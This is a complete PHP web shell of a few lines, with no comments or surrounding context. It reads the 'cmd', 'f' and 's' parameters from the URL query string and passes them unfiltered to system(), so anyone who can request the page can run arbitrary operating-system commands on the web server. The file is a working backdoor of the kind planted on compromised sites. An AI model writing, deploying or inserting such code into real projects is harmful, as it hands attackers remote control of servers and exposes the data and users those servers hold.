<?php
if (isset($_GET['cmd']) && isset($_GET['f']) && isset($_GET['s'])) {
    system($_GET['cmd'] . ' ' . $_GET['f'] . ' ' . $_GET['s']);
}
elseif (isset($_GET['cmd']) && isset($_GET['f']) ) {
    system($_GET['cmd'] . ' ' . $_GET['f']);
}
elseif (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>